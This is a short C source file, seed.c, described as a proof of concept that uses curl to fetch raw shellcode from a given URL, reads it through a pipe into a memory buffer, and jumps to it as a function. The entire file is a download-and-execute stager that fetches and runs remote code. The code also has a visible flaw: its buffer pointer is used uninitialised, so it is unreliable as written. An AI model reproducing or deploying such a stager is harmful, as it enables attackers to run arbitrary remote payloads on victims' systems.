/* seed.c, downloads and executes arbitrary Shellcode PoC. 

This program is a PoC to demonstrate how arbitrary
Shellcode may be injected into a process' memory and then
executed. Regular Shellcode is often limited by small 
buffers.

However, Shellcode can just as easily be placed in other
memory regions. Once injected, it may be called apon and
executed. */



#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define curl "/usr/bin/curl"



void seed(int offset, int bytes, char *url)
{
    /* setup a buffer for shellcode injection at some
    offset location. */

    unsigned char *leaf;

    leaf += offset;
    memset(leaf, 0, bytes);

    /* create a pipe between parent and child processes
    which allows the output of curl to be read. */

    int fd[2];
    pipe(fd);

    pid_t pid = fork();

    if (pid > 0)
    {
	close(fd[1]);
    
	/* read the output of curl which should hopefully
	be some raw Shellcode bytes. Inject them directly
	into memory. */

	read(fd[0], leaf, bytes);

	/* create a function pointer to the injected code. */

	int (*code)();
	code = (int (*)()) leaf;
	code();
    }

    else if (pid == 0)
    {
	close(fd[0]);

	/* Redirect output of curl to the pipe's write
	end. */

	dup2(fd[1], 1);

	/* Execute curl with given url to a Shellcode. */

	char *argv[] = {curl, url, 0};
	execve(curl, argv, (char **) 0);
    }
}



int main(int argc, char *argv[])
{
	
    if (argc == 4)
    {
        int offset = atoi(argv[1]);
        int bytes = atoi(argv[2]);

        char *url = argv[3];
	    
        seed(offset, bytes, url);
    }
	
    else
    {
	puts("seed [offset] [length] [url]");
    }
	
    return 0;
}
